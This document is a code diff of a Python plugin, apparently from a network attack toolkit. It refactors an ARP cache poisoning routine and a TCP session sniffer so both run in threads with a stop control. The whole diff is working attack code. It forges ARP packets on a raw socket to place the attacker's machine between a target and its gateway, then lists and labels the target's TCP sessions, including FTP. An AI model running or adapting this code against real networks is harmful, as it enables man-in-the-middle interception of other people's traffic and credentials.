@@ -56,7 +56,7 @@ class Plugin(BasePlugin):
 
         return pcap_filter
 
-    def _poison(self, dev, src_mac, gateway, target, delay):
+    def _poison(self, dev, src_mac, gateway, target, delay, stop):
         """
         poison arp cache of target and router, causing all traffic between them to
         pass inside our machine, MITM heart
@@ -65,7 +65,7 @@ class Plugin(BasePlugin):
         sock = socket(PF_PACKET, SOCK_RAW)
         sock.bind((dev, dpkt.ethernet.ETH_TYPE_ARP))
         try:
-            while True:
+            while not stop():
                 if config.VERBOSE is True:
                     self.print_output('%s <-- %s -- %s -- %s --> %s',
                                       gateway, target, dev, gateway, target)
@@ -80,7 +80,7 @@ class Plugin(BasePlugin):
                             sock.send(str(utils.build_arp_packet(src_mac, gateway, addr)))
                             sock.send(str(utils.build_arp_packet(src_mac, addr, gateway)))
                         time.sleep(delay) # OS refresh ARP cache really often
-
+            sock.close()
         except KeyboardInterrupt:
             self.print_output('\n\rPoisoning interrupted')
             sock.close()
@@ -102,10 +102,11 @@ class Plugin(BasePlugin):
                     sock.send(str(utils.build_arp_packet(target_mac, gateway, addr)))
                     sock.send(str(utils.build_arp_packet(source_mac, addr, gateway)))
 
-    def run(self, stop, kwargs):
+    def run(self, kwargs):
         """
         Try to get all TCP sessions of the target
         """
+        stop = False
         notorious_services = {
             20: ' ftp-data session',
             21: ' ftp-data session',
@@ -134,40 +135,55 @@ class Plugin(BasePlugin):
         packets.setfilter(pcap_filter) # we need only kwargs['target'] packets
         # need to create a daemon that continually poison our target
         poison_thread = Thread(target=self._poison,
-                               args=(kwargs['dev'], source, kwargs['gateway'], kwargs['target'], 2,))
+                               args=(kwargs['dev'], source, kwargs['gateway'], kwargs['target'], 2, lambda: stop))
         poison_thread.daemon = True
         poison_thread.start()
         self.print_output('Start poisoning on ' + G + kwargs['dev'] + W + ' between ' + G
                           + source + W + ' and ' + R
                           + (','.join(kwargs['target']) if isinstance(kwargs['target'], list) else kwargs['target']) + W +'\n')
-        sessions = {}
-        try:
-            for _, pkt in packets:
-                if stop():
-                    break
-                eth = dpkt.ethernet.Ethernet(pkt)
-                ip_packet = eth.data
-                if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
-                    tcp = ip_packet.data
-                    if tcp.flags != dpkt.tcp.TH_RST:
-                        sess = "%-25s <-> %25s" % (inet_ntoa(ip_packet.src) + ":"
-                                                   + str(tcp.sport), inet_ntoa(ip_packet.dst) + ":"
-                                                   + str(tcp.dport))
-                        check = False
-                        if sess not in sessions:
-                            check = True
 
-                        sessions[sess] = "Others"
+        def sniff_sessions(packets, stop):
+            """
+            Sniff TCP sessions of the target
+            """
+            sessions = {}
+            try:
+                for _, pkt in packets:
+                    if stop():
+                        break
+                    eth = dpkt.ethernet.Ethernet(pkt)
+                    ip_packet = eth.data
+                    if ip_packet.p == dpkt.ip.IP_PROTO_TCP:
+                        tcp = ip_packet.data
+                        if tcp.flags != dpkt.tcp.TH_RST:
+                            sess = "%-25s <-> %25s" % (inet_ntoa(ip_packet.src) + ":"
+                                                       + str(tcp.sport), inet_ntoa(ip_packet.dst) + ":"
+                                                       + str(tcp.dport))
+                            check = False
+                            if sess not in sessions:
+                                check = True
 
-                        if tcp.sport in notorious_services:
-                            sessions[sess] = notorious_services[tcp.sport]
-                        elif tcp.dport in notorious_services:
-                            sessions[sess] = notorious_services[tcp.dport]
+                            sessions[sess] = "Others"
 
-                        if check is True:
-                            self.print_output(" [{:^5}] {} : {}".format(len(sessions), sess, sessions[sess]))
+                            if tcp.sport in notorious_services:
+                                sessions[sess] = notorious_services[tcp.sport]
+                            elif tcp.dport in notorious_services:
+                                sessions[sess] = notorious_services[tcp.dport]
 
-        except KeyboardInterrupt:
-            self.print_output('Session scan interrupted\n\r')
-            self.restore(kwargs['dev'], kwargs['gateway'], kwargs['target'])
-            utils.set_ip_forward(0)
+                            if check is True:
+                                self.print_output(" [{:^5}] {} : {}".format(len(sessions), sess, sessions[sess]))
+
+                # self.print_output('Session scan interrupted\n\r')
+                # self.restore(kwargs['dev'], kwargs['gateway'], kwargs['target'])
+                # utils.set_ip_forward(0)
+            except KeyboardInterrupt:
+                self.print_output('Session scan interrupted\n\r')
+                self.restore(kwargs['dev'], kwargs['gateway'], kwargs['target'])
+                utils.set_ip_forward(0)
+
+        sniff_thread = Thread(target=sniff_sessions, args=(packets, lambda: stop))
+        sniff_thread.start()
+        comm = raw_input()
+        if comm == 'q':
+            stop = True
+            sniff_thread.join()
